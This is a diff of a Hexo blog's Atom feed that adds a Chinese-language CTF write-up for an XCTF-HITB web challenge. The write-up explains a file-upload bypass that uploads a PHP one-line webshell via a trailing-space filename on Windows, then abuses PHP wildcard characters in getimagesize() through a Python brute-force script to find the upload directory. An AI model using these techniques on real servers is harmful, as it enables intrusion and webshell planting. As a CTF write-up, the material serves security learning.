@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://yoursite.com/"/>
-  <updated>2018-04-09T02:49:32.506Z</updated>
+  <updated>2018-04-19T08:52:38.438Z</updated>
   <id>http://yoursite.com/</id>
   
   <author>
@@ -15,6 +15,31 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>记XCTF-HITB一道题</title>
+    <link href="http://yoursite.com/2018/04/14/%E8%AE%B0XCTF-HITB%E4%B8%80%E9%81%93%E9%A2%98/"/>
+    <id>http://yoursite.com/2018/04/14/记XCTF-HITB一道题/</id>
+    <published>2018-04-14T07:12:04.000Z</published>
+    <updated>2018-04-19T08:52:38.438Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="地址"><a href="#地址" class="headerlink" title="地址"></a>地址</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://47.90.97.18:9999/</div></pre></td></tr></table></figure><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>在源码里面发现pic.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://47.90.97.18:9999/pic.php?filename=default.jpg</div></pre></td></tr></table></figure></p><p>返回<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">width=497</div><div class="line">height=477</div></pre></td></tr></table></figure></p><p>然后尝试文件包含，全是返回image error</p><p>在文件上传页面上传文件后抓包<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Server: Microsoft-IIS/7.0</div></pre></td></tr></table></figure></p><p>发现服务器不是linux而是windows</p><p>写个一句话木马，上传1.php，抓包后改为1.php(空格)，由于windows系统的原因最后会变成1.php</p><p>成功之后发现文件路径不知道无法读取文件,然后百度<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://www.moonsec.com/post-304.html</div></pre></td></tr></table></figure></p><p>写到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">已知1.php存在，以上脚本访问的结果是：</div><div class="line">1.php</div><div class="line">1.phP</div><div class="line">1.ph&lt;</div><div class="line">1.ph&gt;</div><div class="line">都能得到返回。</div></pre></td></tr></table></figure></p><blockquote><p>、&lt;可以进行通配<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://www.freebuf.com/column/164698.html</div></pre></td></tr></table></figure></p></blockquote><p>文章提到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">PHP语言某些函数就在Windows系统上拥有了如下奇妙的特性：</div><div class="line">大于号(&gt;)相等于通配符问号(?)</div><div class="line"></div><div class="line">小于号(&lt;)相当于通配符星号(*)</div><div class="line"></div><div class="line">双引号(&quot;)相当于点字符(.)</div></pre></td></tr></table></figure></p><p>以及getimagesiz()函数使用时的一些问题，并且通过两个例子，说明了可以使用通配来进行目录爆破</p><p>先尝试一下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">?filename=../a&lt;/default.jpg</div></pre></td></tr></table></figure></p><p>有回显，说明可以进行爆破<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">#coding:utf-8</div><div class="line">import requests</div><div class="line">url = &quot;http://47.90.97.18:9999/pic.php?filename=../&quot;</div><div class="line">ans = &quot;&quot;</div><div class="line">for i in range(1,100):</div><div class="line">    for j in &apos;0123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM&apos;:</div><div class="line">        url1 = url+ans+j+&apos;&lt;/default.jpg&apos;</div><div class="line">        r = requests.get(url=url1)</div><div class="line">        if &quot;height&quot; in r.content:</div><div class="line">            ans +=j</div><div class="line">            break</div><div class="line">print ans</div></pre></td></tr></table></figure></p><p>得到目录后，使用菜刀连接</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h2 id=&quot;地址&quot;&gt;&lt;a href=&quot;#地址&quot; class=&quot;headerlink&quot; title=&quot;地址&quot;&gt;&lt;/a&gt;地址&lt;/h2&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div c
+      
+    
+    </summary>
+    
+      <category term="web" scheme="http://yoursite.com/categories/web/"/>
+    
+    
+      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
+    
+  </entry>
   
   <entry>
     <title>TP-Link路由器任意命令注入漏洞分析</title>
@@ -340,9 +365,9 @@
       <category term="Crypto" scheme="http://yoursite.com/categories/Crypto/"/>
     
     
-      <category term="cbc" scheme="http://yoursite.com/tags/cbc/"/>
-    
       <category term="Padding Oracle" scheme="http://yoursite.com/tags/Padding-Oracle/"/>
+    
+      <category term="cbc" scheme="http://yoursite.com/tags/cbc/"/>
     
   </entry>
   
